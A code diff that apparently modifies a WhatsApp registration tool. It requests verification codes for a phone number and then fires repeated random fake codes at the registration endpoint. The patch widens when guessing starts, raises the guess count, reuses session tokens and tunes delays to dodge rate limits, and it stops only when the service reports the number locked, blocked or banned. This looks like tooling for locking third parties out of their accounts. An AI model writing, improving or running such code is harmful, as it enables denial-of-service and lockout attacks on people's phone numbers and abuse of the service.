@@ -1058,20 +1058,41 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
 
     let guessLocked = false;
     let guessCountDone = 0;
-    if ((sentOk || reason === "incorrect" || reason === "too_recent") && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
-      const maxGuess = Math.max(1, Math.min(20, parseInt(process.env.WA_FAKE_GUESS_COUNT || "12", 10)));
+    const canGuess =
+      !hardFail &&
+      typeof WADetector.buildRegisterPayloads === "function" &&
+      (
+        sentOk ||
+        reason === "incorrect" ||
+        reason === "too_recent" ||
+        reason === "wrong_code" ||
+        reason === "stale_code" ||
+        reason === "code_mismatch" ||
+        status === "sent" ||
+        status === "ok" ||
+        Boolean(codeText)
+      );
+    if (canGuess) {
+      const maxGuess = Math.max(3, Math.min(20, parseInt(process.env.WA_FAKE_GUESS_COUNT || "15", 10)));
+      const reuseSession = {
+        session: payload.session || null,
+        waToken: payload.waToken || null,
+        version: payload.version || null,
+        platform: payload.platform || "smb_ios",
+        userAgent: payload.userAgent
+      };
       for (let g = 0; g < maxGuess; g++) {
         try {
           assertNotCancelled();
           const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
-          const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
+          const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode, reuseSession);
           if (!regPayload || !regPayload.success || !regPayload.register) break;
-          await new Promise(r => setTimeout(r, 40 + g * 25));
+          await new Promise(r => setTimeout(r, 80 + g * 40));
           assertNotCancelled();
-          registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent, payload.headers, sendTimeout, 2, signal, cleanPhone);
+          registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent || payload.userAgent, payload.headers, sendTimeout, 2, signal, cleanPhone);
           guessCountDone += 1;
           const regJson = safeJsonParse(registerText) || {};
-          const regReason = String(regJson.reason || "").toLowerCase();
+          const regReason = String(regJson.reason || regJson.error || "").toLowerCase();
           const regStatus = String(regJson.status || "").toLowerCase();
           const regWait = numWait(
             regJson.retry_after ?? regJson.sms_wait ?? regJson.voice_wait ?? regJson.wait ?? regJson.email_wait
@@ -1087,10 +1108,15 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
             regReason === "too_many_guesses" ||
             regReason === "too_many" ||
             regReason === "blocked" ||
-            regWait >= 600
+            regReason === "banned" ||
+            regWait >= 600 ||
+            (regStatus === "fail" && regWait >= 300)
           ) {
             guessLocked = true;
             break;
+          }
+          if (regReason === "guessed_too_fast") {
+            await new Promise(r => setTimeout(r, 400));
           }
         } catch (regErr) {
           const rm = String(regErr && regErr.message ? regErr.message : regErr);
